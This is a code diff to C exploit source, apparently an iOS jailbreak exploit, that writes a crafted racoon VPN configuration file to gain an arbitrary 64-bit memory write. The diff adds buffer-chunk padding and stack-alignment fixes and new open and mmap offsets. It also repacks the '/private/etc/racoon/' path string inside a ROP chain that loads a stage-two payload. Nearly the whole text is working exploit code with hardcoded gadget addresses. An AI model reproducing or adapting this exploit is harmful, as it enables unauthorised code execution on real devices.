@@ -39,6 +39,8 @@ struct offset_struct {
 };
 typedef struct offset_struct offset_struct_t;
 #define STAGE2_FD 3
+#define RACOON_YY_BUF_SIZE 16384
+#define BYTES_PER_WRITE 400 // approx amount of bytes we need for one 64-bit write FIXME: this can be prob way lower than 400
 
 void stage1(int fd, offset_struct_t * offsets);
 void get_ip_from_value(char * ip, uint32_t value);
@@ -46,6 +48,7 @@ void www64(int fd,offset_struct_t * offsets, uint64_t where, uint64_t what);
 
 uint32_t oldhigher_lcconf = 0xffffffff; // older value is unknown but we don't write to any address which has all high bits set so we can just set them here and the first time we need it in code we can handle it
 char dns4_array_to_lcconf_distance[16];
+uint32_t total_bytes_written = 0;
 
 void generate(char* filename, offset_struct_t * offsets) {
 	int f = open(filename,O_WRONLY | O_CREAT);
@@ -86,6 +89,7 @@ void change_lcconf(int fd, uint64_t new_addr) {
 		snprintf((char*)(((uint64_t)buf)+strlen(buf)),sizeof(buf)-strlen(buf)-1, "dns4%s;",value_ip);
 	}
 	strcat(buf,"}"); // close the mode_cfg statment
+	total_bytes_written += strlen(buf);
 	write(fd,buf,strlen(buf)); // write it to the config file
 }
 
@@ -129,6 +133,7 @@ void write_to_lcconf(uint32_t what) {
 	}
 
 	strcat(buf,"}"); // close the padding statment
+	total_bytes_written += strlen(buf);
 	write(fd,buf,strlen(buf)); // write it to the config file
 }
 
@@ -143,16 +148,28 @@ void trigger_exec(int fd,uint32_t padding, uint64_t address) {
 	strcat(buf,"\";}");
 	int len = strlen(buf);
 	memcpy(address_in_buf,&address,8);
+	total_bytes_written += len;
 	write(fd,buf,len); // write it to the config file
 }
 
 void www64(int fd,offset_struct_t * offsets, uint64_t where, uint64_t what) {
+	uint32_t current_chunk_size = total_bytes_written % RACOON_YY_BUF_SIZE;
+	if ((current_chunk_size + BYTES_PER_WRITE) > RACOON_YY_BUF_SIZE) {
+		// add padding
+		char tmp[BYTES_PER_WRITE];
+		memset(tmp,0x41,BYTES_PER_WRITE-1);
+		tmp[0] = '#';
+		tmp[BYTES_PER_WRITE-1] = '\n';
+		write(fd,tmp,BYTES_PER_WRITE);
+		total_bytes_written += BYTES_PER_WRITE;
+	}
 	change_lcconf(fd,where-offsets->lcconf_counter_offset);
 	write_to_lcconf(fd,what);
 }
 
 uint64_t get_ropchain_addr(offset_struct_t * offsets) {
 	uint64_t test = offsets->max_slide + offsets->memmove + 16;
+	test += (test % 0x10); // align at 16 bytes (stack alignment)
 	union converter {
 		uint64_t addr;
 		char buf[8];
@@ -162,7 +179,7 @@ uint64_t get_ropchain_addr(offset_struct_t * offsets) {
 	tmp.addr = test;
 	for (int i = 0; i < sizeof(tmp.buf);i++) {
 		if (tmp.buf[i] == '"') {
-			tmp.addr++;
+			tmp.addr += 0x10; // we have to respect stack alignment
 			i = 0;
 		}
 	}
@@ -263,12 +280,15 @@ int install(const char *config_path, const char *racoon_path, const char *dyld_c
 	myoffsets.lcconf_counter_offset = 0x10c;
 	myoffsets.memmove = 0x1aa0b8bb8;
 	myoffsets.longjmp = 0x180a817dc;
+	myoffsets.mmap = 0x18095942c;
+	myoffsets.open = 0x1809779ac;
 	myoffsets.max_slide = 0x66dc000;
 	myoffsets.slide_value = 0x4000;
 	myoffsets.pivot_x21 = 0x1990198fc;
 	myoffsets.str_buff_offset = 8;
 	myoffsets.BEAST_GADGET = 0x1a0478c70;
 	myoffsets.stage2_base = 0x420000000;
+	myoffsets.stage2_size = 0x1000;
 
 
 
@@ -339,7 +359,7 @@ int install(const char *config_path, const char *racoon_path, const char *dyld_c
 		0x1a0478cb4      c0035fd6       ret
 
 		We will call open("/private/etc/racoon/<func pointer>", O_RDONLY); the func pointer will be used to know which slide we need to use
-		Path is stored at 0xb0, we can do this because we assume that the stage2 baseaddress will always have a zero byte
+		Path is stored at 0xc4, we can do this because we assume that the stage2 baseaddress will always have a zero byte
 
 		This means we need to load the address of the path into x26 at [1], x27 will contain the open func pointer and x25 O_RDONLY
 
@@ -371,7 +391,7 @@ int install(const char *config_path, const char *racoon_path, const char *dyld_c
 	ADD_GADGET();							   // 0x20		[2] x23 [3] x3/fourth arg
 	ADD_GADGET();							   // 0x28		[2] x24 [3] x2/third arg
 	ADD_STATIC_GADGET(O_RDONLY);			   // 0x30		[2] x25 [3] x1/second arg
-	ADD_OFFSET_GADGET(0xb0);				   // 0x38		[2] x26 [3] x0/first arg
+	ADD_OFFSET_GADGET(0xc4);				   // 0x38		[2] x26 [3] x0/first arg
 	ADD_CODE_GADGET(myoffsets.open);		   // 0x40		[2] x27 [3] call gadget
 	ADD_GADGET();							   // 0x48		[2] x28 
 	ADD_CODE_GADGET(myoffsets.longjmp);		   // 0x50		[1] (next gadget) [2] 0x29 (but x29 will be overwritten later)
@@ -387,11 +407,11 @@ int install(const char *config_path, const char *racoon_path, const char *dyld_c
 	ADD_GADGET();							   // 0xa0		[2] weird Dx registers
 	ADD_GADGET();							   // 0xa8		[2] weird Dx registers
 
-	ADD_STATIC_GADGET(0x2f707269);			   // 0xb0		[2] new stack top (/pri)
-	ADD_STATIC_GADGET(0x76617465);			   // 0xb8		                  (vate)
-	ADD_STATIC_GADGET(0x2f657463);			   // 0xc0		[3] d9		      (/etc)
-	ADD_STATIC_GADGET(0x2f706163);			   // 0xc8		[3] d8            (/rac)
-	ADD_STATIC_GADGET(0x6f6f6e2f);			   // 0xd0		[3] x28           (oon/)
+	ADD_GADGET();							   // 0xb0		[2] new stack top 
+	ADD_GADGET();							   // 0xb8
+	ADD_STATIC_GADGET(0x6972702f00000000);	   // 0xc0		[3] d9		      (/pri)
+	ADD_STATIC_GADGET(0x6374652f65746176);	   // 0xc8		[3] d8            (vate/etc)
+	ADD_STATIC_GADGET(0x2f6e6f6f6361722f);	   // 0xd0		[3] x28           (/racoon/)
 	ADD_CODE_GADGET(myoffsets.mmap);		   // 0xd8		[3] x27 [4] call gadget
 	ADD_STATIC_GADGET(myoffsets.stage2_base);  // 0xe0		[3] x26 [4] x0/first arg
 	ADD_STATIC_GADGET(myoffsets.stage2_size);  // 0xe8		[3] x25 [4] x1/second arg
